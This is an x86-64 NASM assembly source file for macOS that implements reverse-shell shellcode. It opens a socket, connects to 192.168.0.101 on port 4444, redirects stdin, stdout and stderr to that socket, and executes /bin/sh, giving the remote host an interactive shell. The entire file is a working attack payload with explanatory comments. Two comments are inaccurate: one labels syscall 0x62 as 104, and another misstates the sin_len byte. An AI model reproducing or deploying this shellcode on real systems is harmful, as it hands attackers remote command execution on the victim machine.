bits 64
global _main
;https://opensource.apple.com/source/xnu/xnu-201/bsd/sys/socket.h.auto.html
;socket

_main:
	push    0x2
	pop     rdi               ; RDI = AF_INET = 2
	push    0x1
	pop     rsi               ; RSI = SOCK_STREAM = 1
	xor     rdx, rdx          ; RDX = IPPROTO_IP = 0
	
;store syscall number on RAX
	push    0x61              ; put 97 on the stack (socket syscall#)
	pop     rax               ; pop 97 to RAX
	bts     rax, 25           ; set the 25th bit to 1
	syscall                   ; trigger syscall
	mov r10, rax           ; save socket number to r10

; connect
	mov     rdi, r10           ; put saved socket fd value to RDI = socket fd

; Begin building the memory structure on the stack
	xor     rsi, rsi          ; RSI = sin_zero[8] = 0x0000000000000000
	push    rsi               ;

; next entry on the stack should be 0x00000000 5c11 02 00 = (sin_addr .. sin_len)
	mov     rsi, 0x6500A8C05c110200 ; 192.168.0.101, port sin_port=0x115c, sin_family=0x02, sin_len=0x00
	push    rsi               ; push RSI (=0x6500A8C05c110200) to the stack
	push    rsp
	pop     rsi               ; RSI = RSP = pointer to the structure

	push    0x10
	pop     rdx               ; RDX = 0x10 (length of socket structure)

;store syscall number on RAX
	push    0x62              ; put 104 on the stack (connect syscall#)
	pop     rax               ; pop it to RAX
	bts     rax, 25           ; set the 25th bit to 1
	syscall                   ; trigger syscall

; dup socket

	mov rax, 0x5A
	bts rax, 25
	mov rdi, r10
	xor rsi,rsi
	syscall

	mov rax, 0x5A
	bts rax, 25
	mov rdi, r10
	xor rsi,rsi
	inc rsi
	syscall

	mov rax, 0x5A
	bts rax, 25
	mov rdi, r10
	xor rsi,rsi
	inc rsi
	inc rsi
	syscall
		

; execve
	xor rax,rax
	mov rax,0x3B
	bts rax, 25

	xor rdi,rdi
	push rdi	; null terminator
	mov rdi, '/bin/sh' ; /bin/sh
	push rdi
	mov rdi,rsp  ; argv 1
	xor rsi,rsi  ; argv 2
	xor rdx,rdx  ; argv 3
	syscall


